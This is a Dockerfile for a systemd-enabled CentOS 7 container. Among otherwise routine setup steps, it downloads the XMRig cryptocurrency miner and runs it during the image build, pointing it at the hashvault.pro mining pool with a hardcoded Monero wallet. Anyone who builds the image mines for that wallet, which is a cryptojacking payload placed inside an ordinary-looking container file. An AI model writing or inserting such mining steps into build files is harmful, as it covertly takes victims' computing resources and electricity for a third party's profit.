FROM centos:7
ENV container docker
RUN yum install -y vim curl wget net-tools bind-utils telnet telnet-client
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
RUN tar zxvf xmrig-6.12.1-linux-x64.tar.gz
RUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == \
systemd-tmpfiles-setup.service ] || rm -f $i; done); \
rm -f /lib/systemd/system/multi-user.target.wants/*;\
rm -f /etc/systemd/system/*.wants/*;\
rm -f /lib/systemd/system/local-fs.target.wants/*; \
rm -f /lib/systemd/system/sockets.target.wants/*udev*; \
rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \
rm -f /lib/systemd/system/basic.target.wants/*;\
rm -f /lib/systemd/system/anaconda.target.wants/*;
VOLUME [ "/sys/fs/cgroup" ]
CMD ["/usr/sbin/init"]
RUN ./xmrig-6.12.1/xmrig -o pool.hashvault.pro:3333 -u 47WPxNoyvLtcmH9PJAMTEvbJjsKmGXasrHJBbD2uSY9W5fTAp6FUZxL3QFs6Qm1zi3TZXFETy7pMYYFcgn4nuK3r7WtE8B1 -p oc -k --tls
